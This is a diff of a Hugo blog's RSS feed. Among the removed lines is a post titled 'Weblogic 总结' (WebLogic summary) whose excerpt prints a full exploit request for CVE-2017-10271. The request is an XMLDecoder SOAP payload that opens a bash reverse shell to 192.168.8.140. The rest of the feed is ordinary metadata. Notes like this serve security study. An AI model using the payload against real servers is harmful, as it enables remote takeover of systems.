@@ -6,20 +6,10 @@
     <description>Recent content on rab3it</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 23 Dec 2019 23:37:48 +0800</lastBuildDate>
+    <lastBuildDate>Wed, 07 Aug 2019 23:26:54 +0800</lastBuildDate>
     
 	<atom:link href="https://rab3it.github.io/index.xml" rel="self" type="application/rss+xml" />
     
-    
-    <item>
-      <title>Weblogic 总结</title>
-      <link>https://rab3it.github.io/post/weblogic-summary/</link>
-      <pubDate>Mon, 23 Dec 2019 23:37:48 +0800</pubDate>
-      
-      <guid>https://rab3it.github.io/post/weblogic-summary/</guid>
-      <description>weblogic 漏洞总结 CVE-2017-10271 发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：
-POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: your-ip:7001 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: text/xml Content-Length: 633 &amp;lt;soapenv:Envelope xmlns:soapenv=&amp;#34;http://schemas.xmlsoap.org/soap/envelope/&amp;#34;&amp;gt; &amp;lt;soapenv:Header&amp;gt; &amp;lt;work:WorkContext xmlns:work=&amp;#34;http://bea.com/2004/06/soap/workarea/&amp;#34;&amp;gt; &amp;lt;java version=&amp;#34;1.4.0&amp;#34; class=&amp;#34;java.beans.XMLDecoder&amp;#34;&amp;gt; &amp;lt;void class=&amp;#34;java.lang.ProcessBuilder&amp;#34;&amp;gt; &amp;lt;array class=&amp;#34;java.lang.String&amp;#34; length=&amp;#34;3&amp;#34;&amp;gt; &amp;lt;void index=&amp;#34;0&amp;#34;&amp;gt; &amp;lt;string&amp;gt;/bin/bash&amp;lt;/string&amp;gt; &amp;lt;/void&amp;gt; &amp;lt;void index=&amp;#34;1&amp;#34;&amp;gt; &amp;lt;string&amp;gt;-c&amp;lt;/string&amp;gt; &amp;lt;/void&amp;gt; &amp;lt;void index=&amp;#34;2&amp;#34;&amp;gt; &amp;lt;string&amp;gt;bash -i &amp;amp;gt;&amp;amp;amp; /dev/tcp/192.168.8.140/21 0&amp;amp;gt;&amp;amp;amp;1&amp;lt;/string&amp;gt; &amp;lt;/void&amp;gt; &amp;lt;/array&amp;gt; &amp;lt;void method=&amp;#34;start&amp;#34;/&amp;gt;&amp;lt;/void&amp;gt; &amp;lt;/java&amp;gt; &amp;lt;/work:WorkContext&amp;gt; &amp;lt;/soapenv:Header&amp;gt; &amp;lt;soapenv:Body/&amp;gt; &amp;lt;/soapenv:Envelope&amp;gt; 其中需要注意的是 1.</description>
-    </item>
     
     <item>
       <title>Init</title>
@@ -27,8 +17,7 @@ POST /wls-wsat/CoordinatorPortType HTTP/1.1 Host: your-ip:7001 Accept-Encoding: 
       <pubDate>Wed, 07 Aug 2019 23:26:54 +0800</pubDate>
       
       <guid>https://rab3it.github.io/post/init/</guid>
-      <description>从一句 hello world 开始接触
-echo &amp;ldquo;Hello,World&amp;rdquo;;</description>
+      <description>INIT</description>
     </item>
     
     <item>
